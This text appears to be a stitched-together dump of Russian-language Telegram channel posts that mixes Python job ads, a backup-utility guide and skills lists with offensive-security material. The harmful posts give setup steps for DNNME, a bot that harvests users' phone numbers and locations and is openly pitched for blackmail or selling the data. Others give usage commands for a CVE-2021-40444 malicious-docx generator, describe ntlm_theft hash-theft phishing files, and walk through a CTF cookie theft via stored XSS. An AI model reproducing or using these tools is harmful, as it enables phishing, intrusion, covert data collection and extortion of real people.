Daidzhest vakansii v proekt avtomotiv akkaunta    Na etoi nedele u nas neobychnyi daidzhest. Vse vakansii otnosiatsia k odnomu proektu. Vy budete rabotat' nad zadachami dlia kompanii-razrabotchika sleduiushchego pokoleniia avtonomnykh funktsii manevrirovaniia i parkovki na nebol'shoi skorosti.   Zadach v proekte mnogo: ot kontseptual'noi raboty nad dizainom protsessa, vybora KPI i nabora instrumentov dlia proverki, do integratsii i testirovaniia PO s pomoshch'iu virtual'nykh ili simuliatsionnykh metodov dlia vsemirno izvestnogo klienta. Tak kak klient mezhdunarodnyi, nuzhno znat' angliiskii na urovne B2 Upper Intermediate.   Rabotat' predstoit v Sankt-Peterburge, poetomu esli vy iz drugikh gorodov, bud'te gotovy s nashei pomoshch'iu pereekhat' v severnuiu stolitsu.   Vakansii, na kotorye my ishchem spetsialistov:  Razrabotchik programmnogo obespecheniia na Python dlia avtomobil'noi promyshlennosti ADAS  Trebovaniia: opyt raboty v Python3, Bash, Networking, Git  Podrobnosti - https://clck.ru/Xm5mf    Starshii inzhener-programmist otdela testirovaniia  Trebovaniia: Python, C ++, freimvorki dlia testirovaniia, takie kak GTest, Catch, Google Mock, PyTest  Podrobnosti - https://clck.ru/Xm5p6    Regular Integration SW Developer  Trebovaniia: C ++, Python, ROS, v ideale ROS2, Bash  Podrobnosti - https://clck.ru/Xm5qo    Regular/Senior Simulation razrabotchik na C++, Python  Trebovaniia: C ++ / Python, znanie fiziki, matematiki, ponimanie kak rabotaiut datchiki, kamera, lidar, radar ili dinamiki transportnogo sredstva i modelirovanie, ponimanie 3D grafiki, trassirovki luchei, simuliatsii  Podrobnosti - https://clck.ru/Xm5rA    Regular inzhener-programmist v testirovanii  Trebovaniia: znanie kontseptsii testirovaniia ili validatsii, napisanie spetsifikatsii testa, analiz otdel'nykh i obshchikh rezul'tatov testirovaniia, znanie testovykh platform  Podrobnosti - https://clck.ru/Xm5sf    Razrabotchik ADAS v Python ili Matlab  Trebovaniia: analiticheskoe myshlenie, iazyk stsenariev Python i/ili Matlab, podtverzhdennyi opyt v planirovanii dvizheniia dlia avtomaticheskikh ili avtonomnykh transportnykh sredstv ili planirovanie puti, traektorii ili povedeniia  Podrobnosti - https://clck.ru/Xm5tn    Build inzhener Continental Parking  Trebovaniia: umenie integririrovat' i adaptirovat' razlichnye komponenty, provodit' obzor programmnogo obespecheniia, adaptirovat' arkhitekturu, dizaina i Unit testy  Podrobnosti - https://clck.ru/Xm5vC   #luxoft_career_russia

Davno ne bylo zametok pro poleznye utility dlia bekapa. Reshil eto ispravit'. Rasskazyvaiu pro Butterfly Backup. Eto nebol'shaia konsol'naia obiortka nad rsync, napisannaia na python. Ideia eio v tom, chto ona ispol'zuet osnovnoe preimushchestvo rsync - skorost' sravneniia i kopirovaniia informatsii. A tak zhe dobavliaet nekotoruiu gibkost', kotoroi iznachal'no v rsync net. To est' rasshiriaet ego funktsional.    https://github.com/MatteoGuadrini/Butterfly-Backup  https://butterfly-backup.readthedocs.io/en/latest/    Butterfly Backup izbavliaet ot neobkhodimosti pisat' sobstvennuiu bash obviazku vokrug rsync dlia organizatsii inkrementnykh ili raznostnykh bekapov. Tak zhe uproshchaet vosstanovlenie i prosmotr soderzhimogo bekapov. Dlia udobstva mozhno podgotovit' gotovyi konfig.    Osnovnye vozmozhnosti:     Podderzhivaemye bekapy: Full, Incremental, Differential, Mirror.     Ispol'zovanie tsentral'nogo servera dlia khraneniia bekapov raznykh klientov.     Detal'nyi prosmotr soderzhimogo otdel'nykh bekapov.     Bekap vsei sistemy, a tak zhe ee vosstanovlenie na drugoe zhelezo ili VM.     Printsip sniatiia dannykh agent-less, po protokolu rsync ili ssh.    Dlia raboty BB nuzhen Python3. Dalee dostatochno skopirovat' repozitorii i zapustit' skript ustanovki:  git clone https://github.com/MatteoGuadrini/Butterfly-Backup.git  cd Butterfly-Backup  sudo python3 setup.py    Posle etogo kopiruem rsa kliuchi, kotorye predvaritel'no sozdali, na udalennyi host, chtoby imet' k nemu dostup:  bb config --deploy host1    Dal'she zapuskaem prostoi bekap:  bb backup --computer host1 --destination /mnt/backup --data System --type Unix    U bb est' prednastroiki dlia tipovykh bekapov triokh tipov sistem - Unix, Windows, MacOS. Esli ukazat' posle kliucha data tip dannykh i dalee tip sistemy, to budet zabekapleno vsio, chto otnositsia k etomu tipu. V moem primere eto sistemnye direktorii.    Po ssylke na dokumentatsiiu, chto ia privel v nachale, mozhno posmotret' vse osnovnye vozmozhnosti i kliuchi dlia bekapa i vosstanovleniia.

!! Junior Python Developer Privet! hybrid.ai -- samyi innovatsionnyi i nezavisimyi adtech proekt v Rossii. hybrid.ai -- mezhdunarodnaia programmatic-platforma. My razrabatyvaem reklamnye tekhnologii dlia vedushchikh mirovykh agentstv i brendov. Den' za dnem my uluchshaem funktsional'nye vozmozhnosti i kachestvo produktov dlia prevoskhodnogo rezul'tata reklamnykh kampanii. My sotrudnichaem s takimi krupnymi mirovymi kompaniiami kak Google, Facebook, Yandex, AppNexus, Begun, Mopub i mnogimi drugimi. Sredi nashikh klientov bolee 100 krupneishikh reklamnykh agentstv (GroupM, BBDO, Dentsu Aegis Network, Publicis Groupe i dr.), i bolee 300 vedushchikh brendov (Audi, Lexus, Honda, Nestle, Red Bull, Asus, P&G, Schwarzkopf i dr.). Ofisy hybrid.ai nakhodiatsia v Rossii, Germanii, SShA, Indii, Pol'she i Singapure.Seichas my v aktivnom poiske Junior Python Developer v sviazi s rasshireniem shtata. Chem predstoit zanimat'sia:  Napisanie skraperov dlia saitov, parsing dannykh; Refaktoring sushchestvuiushchikh prilozhenii; Razrabotka Rest Api i napisanie dokumentatsii k nemu; Integratsiia so storonnimi API; Razvitie sistemy monitoringa; Sozdanie prilozhenii dlia polucheniia i analiza dannykh.  Nashi trebovaniia k kandidatam:  Znanie Python3; Znanie Linux na urovne pol'zovatelia; Ponimanie chem otlichaiutsia SQL ot NoSql. Opyt raboty s kakoi libo bazoi; Znanie kakogo libo veb - freimvorka (naprimer Flask); Ponimanie printsipov Rest; Stremlenie pisat' chitaemyi kod; Bazovye znaniia sistem kontrolia versii (Git); Angliiskii iazyk na urovne svobodnogo chteniia dokumentatsii;  Chto my predlagaem dlia komfortnoi raboty:  Druzhnaia komanda i liogkaia kommunikatsiia; Professional'noe razvitie, svoboda proiavleniia idei i myslei; Shtatnyi prepodavatel' angliiskogo iazyka; Korporativnyi trener iogi.  A teper' o formal'nom:  Gibkoe nachalo i okonchanie rabochego dnia; Oformlenie i garantii po TK RF; Uiutnyi ofis v tsentre goroda so vsemi pliusami.       Sviazat'sia mozhno po ssylke: https://resumetrud.com/tambov/vakansii/15732135/  #rabota_v_Rossii #rabota_Tambov #Junior_PythonDeveloper

Chto nuzhno znat' Python-razrabotchiku Startovat' v liuboi kar'ere, v tom chisle i python-programmistu stoit s azov professii. Itak, davaite dlia nachala razberiomsia, kakimi znaniiami dolzhen obladat' Junior Python-developer (novichok). Potentsial'nomu Python-spetsialistu sleduet chitat' mnogo literatury, umet' bystro nakhodit' nuzhnuiu informatsiiu, a takzhe:    Predstavliat' chto takoe operatsionnye sistemy, dlia chego oni nuzhny, kakie tam proiskhodiat protsessy;  Znat', chto takoe potok;  Chto takoe sokety i dlia chego oni nuzhny;  Predstavliat', kak ustroen stek protokolov TCP/IP;  Chto takoe Linux, sh.;  Ponimat' virtualizatsiiu i vse eio tipy;  Umet' nastraivat' onlain-mashiny s pomoshch'iu razlichnykh instrumentov;  Ponimat', chto takoe OOP i ego funktsional;  Rabotat' s GIT(sozdavat' vetki);  Ponimat', chto takoe MVC i zachem on nuzhen;  Umet' rabotat' s bazami dannykh;  Ponimat' asinkhronnuiu kontseptsiiu programmirovaniia;  Rabotat' s nginx (nastroika proksi);  Razbirat'sia v otlichiiakh Python2 ot Python3;  Predstavliat' chto takoe algoritm importa modulei v Python;  Chto predstavliaiut iz sebia generatory i iteratory;  Ponimat' chto takoe GIL i zachem on nuzhen;  Razbirat'sia v WSGI i ponimat' kak ispol'zovat' ego v rabote.  Okunuvshis' v novyi mir i poniav kak mnogo v niom interesnogo, programmisty s novym opytom prodolzhaiut svoi kar'ernyi put'. Dalee, rassmotrim spisok togo, chto dolzhen znat' python-razrabotchik v srednem, po mneniiu rabotodatelei (v dopolnenie k predydushchim trebovaniiam):    Umelo ispol'zovat' sam iazyk, biblioteki, ego sintaksis, veb-freimvorki (Django i Flask);  Ponimat' printsipy raboty s bazami dannykh, algoritmami i SQL;  Angliiskii iazyk, potomu chto komandy v Python pishutsia na etom iazyke;  Znat' i umet' ispol'zovat' v rabote sistemy kontrolia versii (Git);  Ponimat' upravlenie paketami (versii, zavisimosti) v distributive i okruzhenii Python;  Umet' testirovat' kod, rabotat' s nepreryvnoi integratsiei;  Razbirat'sia v optsiiakh razviortyvaniia koda;  Realizovyvat' vse urovni steka (proekta);  Rabotat' s bibliotekami dlia raspredeleniia i obrabotki dannykh;  Umet' rabotat' v komande na urovne koda: pisat' chitaemyi kod, analizirovat' kod svoikh kolleg (code-review);  Ponimat' metodologiiu razrabotki.  Vmeste s etimi navykami spetsialistu neobkhodimy takie lichnye kachestva kak usidchivost', trudoliubie, analiticheskii sklad uma i umenie rabotat' v komande.

Stat'ia iavliaetsia prodolzheniem pervoi, vtoroi i tret'ei chastei, posviashchionnykh organizatsii prakticheskoi bezopasnosti setei, postroennykh na oborudovanii MikroTik. Ranee byli rassmotreny obshchie rekomendatsii, bezopasnost' urovnei L1, L2 i L3, realizatsiia tsentralizovannogo logirovaniia. Nastalo vremia pogovorit' pro razviortyvanie IDS i eio integratsiiu v infrastrukturu RouterOS.

Konechno sozdateli OpenWRT uzhe predusmotreli vozmozhnost' sborki kastomnykh paketov ob etom mozhno pochitat' vot tut: https://habr.com/ru/company/ruvds/blog/530984/ . No dannyi sposob ochen' dolgii, prikhoditsia skachivat' iskhodniki OpenWRT, kompilirovat' tulchain i prochee. I ia podumal a pochemu-by prosto ne skachat' tulchain i sobrat' proekt obychnym obrazom. Pod katom moi opyt.

DNNME (https://github.com/lamer112311/DNNME.git) -- telegram-bot, kotoryi <<uznaet>> dannye po nomeru telefona. A chtoby poluchit' <<dannye>> nuzhno zaregistrirovat'sia v bote, tem samym pol'zovatel' otpravliaet kontakt botu i geopozitsiiu, v rezul'tate my imeem nomer i geolokatsii pol'zovatelia    Vse dannye s bota budut idti priamo k vam v ls v Telegram. Primenenii mozhno naiti mnogo, k primeru, obychnyi shantazh, libo sbor ogromnoi bazy pol'zovatelei, kotoruiu v posledstvii mozhno prodat'.    Ustanovka    $ apt update  $ apt upgrade -y  $ apt install git python3  $ pip3 install colorama pyTelegramBotAPI  $ git clone https://github.com/lamer112311/DNNME.git  $ cd DNNME    Teper' perekhodim v Telegram. otkryvaem @my_id_bot, kopiruem nash ID i zapisyvaem ego. Perekhodim v [id199142634|@BotFather], vvodim /newbot, dalee pishem nuzhnye dannye. Kogda sam bot sozdan, kopiruem ego token i zapisyvaem ego.    Zapusk    $ python3 Build.py    Vvodim nash Telegram ID, potom vvodim Token bota. V papke dolzhen poiavitsia gotovyi skript dlia zapuska bota.    $ python3 Dnnme.py  Diskleimer: Predstavlennyi material, iavliaetsia oznakomitel'nym . Avtor ne nesiot otvetstvennosti za deistviia sovershennye chitateliami.    Skript polnost'iu rabochii

A tool for generating multiple types of NTLMv2 hash theft files.  ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.  The benefits of these file types over say macro based documents or exploit documents are that all of these are built using "intended functionality". None were flagged by Windows Defender Antivirus on June 2020, and 17 of the 21 attacks worked on a fully patched Windows 10 host.  ntlm_theft supports the following attack types:    Browse to Folder Containing    .url - via URL field  .url - via ICONFILE field  .lnk - via icon_location field  .scf - via ICONFILE field (Not Working on Latest Windows)  autorun.inf via OPEN field (Not Working on Latest Windows)  desktop.ini - via IconResource field (Not Working on Latest Windows)      Open Document    .xml - via Microsoft Word external stylesheet  ... #ntlm_theft #windows #windows10 #windowsdefender

Malicious docx generator to exploit CVE-2021-40444 (Microsoft Office Word Remote Code Execution)Creation of this Script is based on some reverse engineering over the sample used in-the-wild: 938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52 (docx file)You need to install lcab first (sudo apt-get install lcab)Check REPRODUCE.md for manual reproduce stepsIf your generated cab is not working, try pointing out exploit.html URL to calc.cabUsingFirst generate a malicious docx document given a DLL, you can use the one at test/calc.dll which just pops a calc.exe from a call to system()python3 exploit.py generate test/calc.dll http://Once you generate the malicious docx (will be at out/) you can setup the server:sudo python3 exploit.py host 80Finally try the docx in a Windows Virtual Machine:  #cve-2021-40444 #generator #python3 #remote #reverse #reverseengineering #windows

V komandu Whalemap.io ishchem Backend i Frontend razrabotchikov. (Fronty, pishite v lichku, prishliu opisanie)  Whalemap - eto platforma, kotoraia obsluzhivaet investorov i treiderov kriptovaliutnogo rynka. My predostavliaem pol'zovateliu dostup k intuitivno poniatnoi i tochnoi analitike kriptovaliutnogo rynka. Na dannyi moment my imeem okolo 30k zaregistrirovannykh pol'zovatelei.  Zarplatnaia vilka: 150 000 - 300 000 R na ruki  Kakoi nuzhen stek? * Python3, Django/Flask, Numpy, Pandas, Plotly, Nginx/Apache2 * SQL: indeksy, tranzaktsionnost', okonnye funktsii * BD: SQLAlchemy, Redis, Vertica/Clickhouse, PostgreSQL * CI/CD: Gitlab CI, Docker, K8s * Ocheredi: ZMQ, RabbitMQ, Kafka * Linux: Ubuntu 18 * Prometheus, Grafana, EFK, Sentry * Bol'shim pliusom budut prakticheskii opyt s Threading/Multiprocessing v Python, administrirovanie AWS i opyt programmirovaniia na C++  Chto nuzhno delat'? * Zanimat'sia razrabotkoi biznes-logiki i back-end sistemy dlia podderzhki platformy Whalemap.io * Uchastvovat' v protsesse razrabotki novykh fich (ikh budet mnogo) * Vnosit' svoi predlozheniia kak po tekhnicheskomu, tak i po produktovomu uluchsheniiu platformy, a takzhe predlagat' svoi idei i proveriat' ikh sostoiatel'nost' * Derzhat' ruku na pul'se novykh tekhnologii i vnedriat' ikh, kogda eto prinesiot pol'zu proektu i komande * Uchastvovat' v uluchshenii protsessov komandy razrabotki * Provodit' rev'iu koda kolleg po komande * Samostoiatel'no reshat' zadachi  Usloviia: - Udalionnaia ili rabota v ofise (Moskva) na tvoi vybor  - Gibkii rabochii den'; - Dinamichno razvivaiushchaiasia kompaniia; - Innovatsionnyi, progressivnyi proekt; - Druzhnyi kollektiv.  Nash tvitter: https://twitter.com/whale_map Nash sait: https://whalemap.io

Hack The Box. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov Ad res mashiny -- 10.10.10.234, dobav liaem ego v /etc/hosts i nachina em ska niro vanie por tov. Spravka: skanirovanie portov Ska niro vanie por tov -- stan dar tnyi per vyi shag pri liuboi ata ke. On poz volia et ata kuiushche mu uznat', kakie sluzh by na khos te pri nima iut soedi nenie. Na osno ve etoi informa tsii vybira etsia sle duiushchii shag k poluche niiu toch ki vkho da. Na ibo lee izves tnyi ins tru ment dlia ska niro vaniia -- eto Nmap. Uluch shit' rezul' taty ego raboty ty mozhesh' pri pomoshchi sle duiushche go skrip ta. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 On dei stvu et v dva eta pa. Na per vom pro izvo dit sia obych noe bys troe ska niro vanie, na vto rom -- bolee tshcha tel' noe ska niro vanie, s ispol' zovani em ime iushchikh sia skrip tov (optsiia -A). Re zul' tat raboty skrip taNa khodim tri otkry tykh por ta: 22 (sluzh ba SSH), 80 (veb-ser ver Apache 2.4.46) i 33060. Per vym delom proi dem sia po sai tu i soberem informa tsiiu. Star tovaia stra nitsa sai taNa stra nitse About my nakhodim poch tu dlia svia zi, a tak zhe domen -- schooled.htb. Stra nitsa About Skanirovanie veb-kontenta Bol' she nichego nai ti ne uda los', a tak kak schooled.htb oka zal sia zaregis tri rovan nym domenom, sto it pomimo ska niro vaniia fai lov i direk torii pereb rat' tak zhe i pod domeny. Ia eto delaiu s pomoshch'iu Burp Intruder -- on ume et pro dol zhat' ska niro vat' pos le obry va soedi neniia. Perenap ravlia em zap ros v Intruder, uka zyva em slo var' /Discovery/DNS/subdomains-top1million-5000.txt iz nabora SecLists, a tak zhe usta novim 120 potokov. Nas troi ka Burp -- Positions Nas troi ka Burp -- Payloads Nas troi ka Burp -- Options Re zul' tat perebo raI my nakhodim novyi pod domen -- moodle.schooled.htb. Sra zu dobavim ego v /etc/hosts i pos motrim, chto tam. Star tovaia stra nitsa MoodleMoodle -- eto veb-pri lozhe nie, pri pomoshchi kotoro go mozh no delat' sai ty dlia onlai novogo obu cheniia. Sis tema poz volia et nas tra ivat' makety stra nits, k tomu zhe mozh no naladit' integra tsiiu s raz nym PO, vkliu chaia ins tru men ty dlia obshche niia, sov mes tnoi raboty i upravle niia dokumen tami. Chto ochen' vazh no, Moodle ras prostra niaet sia svo bod no i ime et otkry tyi iskhodnyi kod. For ma avto riza tsii Moodle Tochka vkhoda Poisk eksploitov Tak kak my ime em delo s gotovym pro duk tom, net smys la <<tykat' kavych ki>> samos toiatel' no. Goraz do pro duk tivnee budet uznat' toch nuiu ver siiu i pois kat' informa tsiiu ili otche ty ob uzhe ime iushchikh sia uiaz vimos tiakh, a voz mozhno, i gotovye eks plo ity. Mozh no nai ti is khodnye kody na GitHub i uznat', gde v prog ramme ras polozhe na informa tsiia o tekushchei ver sii. Smot rim, chto u nas na ser vere, i uzna em, chto ispol' zuet sia ver siia 3.9. Fail upgrade.txt v repozi tori iakh GitHub Zap ros fai la upgrade.txt na ser vereTe per' mozhem pois kat' informa tsiiu ob uiaz vimos tiakh i gotovykh eks plo itakh. Spravka: poisk gotovykh eksploitov Pri pen teste luch she vse go iskat' eks plo ity pri pomoshchi Google, pos kol' ku etot pois kovik zag liadyva et i v lich nye blo gi, i v samye raz nye otche ty. Usko riat delo spe tsiali ziro van nye bazy vro de Exploit-DB -- tam chas to mozh no obna ruzhit' pod khodiashchie vari anty. Esli ty rabota esh' v spe tsiali ziro van noi OS vro de Kali Linux, to eta baza u tebia uzhe est' i dlia pois ka mozh no ispol' zovat' uti litu searchsploit. Eks plo ity, nai den nye searchsploitDlia ver sii 3.9 eks plo itov net, no est' dlia bolee sve zhei 3.10.3. Sto it ee pop robovat', tak kak est' vero iatnost', chto uiaz vimost' pri suts tvu et i v ran nikh ver siiakh. Pos motrim detali uiaz vimos ti. searchsploit -p php/ webapps/ 49714. txt Po luche nie eks plo ita Opi sanie uiaz vimos ti Ekspluatatsiia Stored XSS Eta ver siia uiaz vima k ata ke XSS, pri chem khra nimoi. Dlia pro ver ki uiaz vimos ti regis tri ruem sia i avto rizu emsia v sis teme. Vned rit' kod mozh no cherez pole MoodleNet profile v nas troi kakh pol' zovate lia. Davai vned rim sle duiushchii kod, kotoryi budet pokazy vat' okosh ko s tek stom 1.  Sokh ranenie nag ruzkiTak kak eto Stored XSS, kod budet vypol niat' sia kazh dyi raz pri pros motre pol' zovate lem nashego pro filia. Vy pol nenie koda pri pros motre pro filiaTak kak uiaz vimost' pod tverzhde na, my mozhem ukrast' cookie. Dlia eto go otkro em na lokal' nom khos te veb-ser ver python3. python3 -m http. server 8888 A teper' vned rim kod, kotoryi budet zag ruzhat' s nashego ser vera kar tinku, a v kaches tve paramet ra budem pereda vat' kuki. Tak oni i popadut k nam.  Lo gi veb-ser veraSre di mno zhes tva zap rosov my nakhodim tot, zna chenie paramet ra kotoro go otli chaet sia. Pod stav liaem poluchen nye cookie i perezag ruzha em stra nitsu. Tak my nachina em rabotat' pod uchet noi zapis'iu pre poda vate lia. Te kushchii pol' zovatel'

V iiule 2021 goda Tsentr po issledovaniiu korruptsii i organizovannoi prestupnosti (OCCRP) vmeste s 16 media v raznykh stranakh nachal publikovat' proekt, rasskazyvaiushchii ob izrail'skom programmnom obespechenii Pegasus, s pomoshch'iu kotorogo v desiatke stran mira velas' slezhka za telefonami zhurnalistov, aktivistov i politikov. Kazakhstan okazalsia v chisle etikh stran (2000 kazakhstanskikh nomerov, vkliuchaia, naprimer Askara Mamina i dazhe Kasym-Zhomarta Tokaeva). I mozhno predpolozhit', chto edva li slezhka zakonchitsia na etom, a spisok imion liudei, za kotorymi sledili, naverniaka ne polon. Poetomu predlagaem vam instruktsiiu, kotoraia pomozhet vam samostoiatel'no uznat', podvergalsia li vash smartfon atake Pegasus (i ne tol'ko).

OnGrid Systems -- kompaniia byla osnovana v nachale 2017 goda gruppoi inzhenerov, kotorye reshili ispol'zovat' svoi obshirnye znaniia i opyt v oblasti telekommunikatsii, informatsionnoi bezopasnosti, razrabotki programmnogo i apparatnogo obespecheniia v novoi oblasti: razrabotke blokchein- i detsentralizovannykh sistem.  Na tekushchii moment v kompanii formiruetsia dopolnitel'naia komanda razrabotki pod novyi mezhdunarodnyi proekt v sfere fintekh/DeFi.  Za 4 goda kompaniia priniala uchastie v realizatsii bolee 50 proektov, sviazannykh s integratsiei tekhnologii blokchein i razrabotkoi detsentralizovannykh platform. Sredi realizovannykh nami proektov bol'shoi nabor biznes-prilozhenii, DAO-platform, DeFi-platform, tokenseil smart-kontraktov, a takzhe razrabotka arkhitektury kriptograficheskikh smart-kart, softvernykh koshel'kov i programmnogo obespecheniia POS-terminalov.  > Otkryty sleduiushchie vakansii:    Middle Python razrabotchik;  Middle JS/React razrabotchik;  > Trebovaniia:    Vladenie odnim iz vysokourovnevykh iazykov -- python3 i/ili JavaScript;  Znanie Web-tekhnologii ot brauzera do veb-servera, protokola HTTP;  Vladenie praktikami sovmestnoi raboty s kodom v Github/Gitlab;  Znanie Linux v chasti seti i bazovogo administrirovaniia;  Znanie angliiskogo iazyka na urovne chteniia tekhnicheskoi dokumentatsii;   Budet bol'shim pliusom:    Ponimanie arkhitektury detsentralizovannykh prilozhenii i smart-kontraktov (EVM);  Zainteresovannost' v detsentralizovannykh tekhnologiiakh i razvitii bystrorazvivaiushchikhsia stekov;  Vladenie angliiskim iazykom na urovne Upper-intermediate+;  > Usloviia:   -- Gibkii grafik v odnom iz ofisov. Seichas rabotaiut dva ofisa -- v Zelenograde i v Klinu. -- Inogorodnim soiskateliam pomoshch' v relokatsii; -- Rabochii noutbuk MacBook Pro ili analogichnyi; -- Razmer zarplaty po itogam sobesedovaniia; -- Ezhemesiachnye premii, premii po itogam sdachi proektov; -- Vozmozhnost' profil'nogo obucheniia za schet kompanii (oplata konferentsii, kursov, khakatonov);   Dlia zhelaiushchikh zarabatyvat' bol'she est' mnogo vozmozhnostei dlia rosta (vziatie na sebia roli team lead, vedenie vnutrennego obucheniia, podgotovka dokumentatsii i napisanie statei).  Zarabotnaia plata ot 100 000 rublei  Ofis raspolozhen po adresu: Zelenograd, Savelkinskii proezd, 4, 27 etazh.  Tel: 8-906-750-52-57   d.suldin@ongrid.pro Ssylka na sait kompanii i na vakansiia na HHv pervom kommentarii. #reklama_zelenogradru #zelenograd #rabota

AutoHarness is a tool that automatically generates fuzzing harnesses for you. This idea stems from a concurrent problem in fuzzing codebases today: large codebases have thousands of functions and pieces of code that can be embedded fairly deep into the library. It is very hard or sometimes even impossible for smart fuzzers to reach that codepath.  Even for large fuzzing projects such as oss-fuzz, there are still parts of the codebase that are not covered in fuzzing. Hence, this program tries to alleviate this problem in some capacity as well as provide a tool that security researchers can use to initially test a code base. This program only supports code bases which are coded in C and C++.Setup/DemonstrationThis program utilizes llvm and clang for libfuzzer, Codeql for finding functions, and python for the general program. This program was tested on Ubuntu 20.04 with llvm 12 and python 3. Here is the initial setup.  sudo apt-get update;sudo apt-get install python3 python3-pip llvm-12* clang-12 git;pip3 install pandas lief subprocess os argparse ast;  Follow the installation procedure for Codeql on https://github... #autoharness #performance #procedure #python #python3

Osvoenie Termux kak udobnoi podruchnoi konsoli.  Chto takoe Termux? Eto konsol' na OS Android. Tem samym ona stanovitsia nashim glavnym i podruchnykh sredstvom raboty.  Skachat' ego mozhno po etoi ssylke: https://termux.com/  Kak tol'ko vy ego skachali vy uvidete samu konsol'  Propisyvaem:  pkg update   apt update   apt upgrade  Dalee nam nuzhno ustanovit' vse samoe neobkhodimoe dlia pol'zovaniia Termux.   V osnovnom vse skripty i progi my budem brat' s GitHub, poetomu ustanovim pakt git, kotoryi budet skachivat' skripty s repozitoriia.   pkg install git  Teper' my mozhem skachivat' repozitorii (iashchiki s skriptami)   Dlia etogo: git clone "ssylka na repozitorii"   V ostal'nom vse pridiot so vremenem.   Teper' proidiomsia po osnovnym komandam v termuks.   cd - komanda dlia osnovnogo peremeshcheniia.  cd "nazvanie papki"  cd bez nichego vozvrashchaet vas na pervonachal'nuiu papku  ls - pokazyvaet soderzhimoe papki  mkdir - sozdaiot papki   mv - peremeshchaet chto libo   rm - udaliaet chto libo   Tak zhe dlia udobstva mozhno ustanovit' repozitorii termux - ohmyzsh chtoby bylo legche i krasivee adaptirovat'sia v termukse.   + ustanovim instrumenty v Termux   pkg install termux-tools  Teper' my mozhem otkryvat' faily v termuks.   termux-open "fail"   Teper' ustanovim osnovnye iazyki programmirovaniia dlia ispol'zovaniia utilitami:  Piton apt install python  apt install python2 apt install python3  Ustanovim tak zhe klassnyi repozitorii s gitkhaba  git clone https://github.com/AnonHackerr/toolss  S pomoshch'iu ego, mozhno ustanovit' raznye "instrumenty" v Termux.   Poka chto vse, nadeius' etogo khvatit dlia osvoeniia nachala raboty.

HomePwn (https://github.com/Telefonica/HomePWN) - eto platforma, kotoraia predostavliaet funktsii dlia audita i testirovaniia ustroistv, kotorye sotrudniki kompanii mogut ispol'zovat' v svoei povsednevnoi rabote i v odnoi i toi zhe rabochei srede.    On prednaznachen dlia poiska ustroistv v dome ili ofise, ispol'zovaniia opredelennykh uiazvimostei dlia chteniia ili otpravki dannykh na eti ustroistva. Blagodaria moshchnoi biblioteke modulei vy mozhete ispol'zovat' etot instrument dlia zagruzki novykh funktsii i ispol'zovaniia ikh na samykh raznykh ustroistvakh.    Ustanovka    $ git clone https://github.com/Telefonica/HomePWN  $ cd HomePWN  $ sudo ./install.sh    Ispol'zovanie    $ sudo python3 homePwn.py   Diskleimer: Predstavlennyi material, iavliaetsia oznakomitel'nym . HostHunter es una herramienta completamente gratuita para descubrir y extraer de forma eficiente los hostname, o nombre de host, que proporcionan un gran conjunto de direcciones IP publicas. Esta herramienta utiliza tecnicas sencillas de OSINT para asignar direcciones IP con nombres de host virtuales, permite generar un archivo CSV o TXT que contiene toda la informacion recopilada. ?Quieres saber de todo lo que es capaz esta herramienta?  Principales caracteristicas de HostHunter HostHunter es una herramienta basada en python3 que esta disenada especificamente para descubrir los dominios o los hostname que pertenecen a una o varias direcciones IP publicas. Nosotros podemos pasarle a esta herramienta un archivo TXT con todas las direcciones IP que queremos investigar, automaticamente la herramienta nos indicara todos los dominios encontrados en una determinada direccion ip publica, ademas, tambien podria indicarnos si hay alguna web app funcionando en esa direccion IP en concreto. Este reconocimiento se realiza a traves de tecnicas OSINT sencillas, por lo que realmente no realiza ning&#25..

Hack The Box. My pro vedem tes tirova nie kli ent-ser verno go pri lozhe niia, ser vernaia chast' kotoro go napisa na na Node.js. A zatem porabo taem s orkes tra torom Kubernetes i cherez nego zakh vatim flag ruta. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov Do bav liaem adres mashiny 10.10.10.235 v fail /etc/hosts kak unobtainium.htb i zapus kaem ska niro vanie por tov. Spravka: skanirovanie portov Ska niro vanie por tov -- stan dar tnyi per vyi shag pri liuboi ata ke. On poz volia et ata kuiushche mu uznat', kakie sluzh by na khos te pri nima iut soedi nenie. Na osno ve etoi informa tsii vybira etsia sle duiushchii shag k poluche niiu toch ki vkho da. Na ibo lee izves tnyi ins tru ment dlia ska niro vaniia -- eto Nmap. Uluch shit' rezul' taty ego raboty ty mozhesh' pri pomoshchi sle duiushche go skrip ta. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 On dei stvu et v dva eta pa. Na per vom pro izvo dit sia obych noe bys troe ska niro vanie, na vto rom -- bolee tshcha tel' noe ska niro vanie, s ispol' zovani em ime iushchikh sia skrip tov (optsiia -A). Re zul' tat raboty skrip ta Re zul' tat raboty skrip ta (pro dol zhenie) Re zul' tat raboty skrip ta (okon chanie)Po rezul' tatam ska niro vaniia ime em vosem' otkry tykh por tov: port 22 -- sluzh ba SSH; port 80 -- Apache httpd 2.4.41; por ty 2379, 2380 -- poka neias no, chto eto; port 8443 -- tozhe veb-ser ver; por ty 10250, 10256 -- Golang HTTP-Server; port 31337 -- Node.js Express framework. Nach nem s osmotra sai ta. Star tovaia stra nitsa sai taZdes' nam daiut tol' ko ska chat' kakoe-to pri lozhe nie, chto my i dela em. Ska chiva em paket .deb i raz vorachi vaem, chto by ne usta nav livat' na lokal' nyi khost. Zatem nakhodim ispolnia emyi fail i zapus kaem pri lozhe nie. mkdir ubo ; cd mkdir dpkg- deb -xv unobtainium_ 1. 0. 0_ amd64. deb . . / opt/ unobtainium Ras pakov ka paketa deb Glav noe okno pri lozhe niiaIzu chiv pri lozhe nie, ponima em, chto ono ime et kli ent-ser vernuiu arkhi tek turu. Zdes' est' for ma otprav 